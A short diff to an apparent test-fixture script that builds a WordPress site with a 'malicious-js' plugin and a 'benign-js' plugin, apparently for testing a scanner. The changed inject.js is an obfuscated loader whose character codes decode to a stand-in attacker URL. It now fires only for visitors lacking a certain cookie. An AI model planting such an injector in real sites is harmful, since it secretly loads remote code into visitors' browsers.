@@ -40,7 +40,7 @@ function normal_plugin_assets() {
 PHP
 
 cat > "$SITE/wp-content/plugins/malicious-js/inject.js" <<'JS'
-(function(){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120,46,106,115);document.head.appendChild(s);}());
+if(document.cookie.indexOf('pw_seen=')===-1){var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,115,58,47,47,101,118,105,108,46,101,120,97,109,112,108,101,47,120,46,106,115);document.head.appendChild(s);}
 JS
 cat > "$SITE/wp-content/plugins/benign-js/app.js" <<'JS'
 (function(){var s=document.createElement('script');s.src='https://cdn.example.com/app.js';document.head.appendChild(s);}());
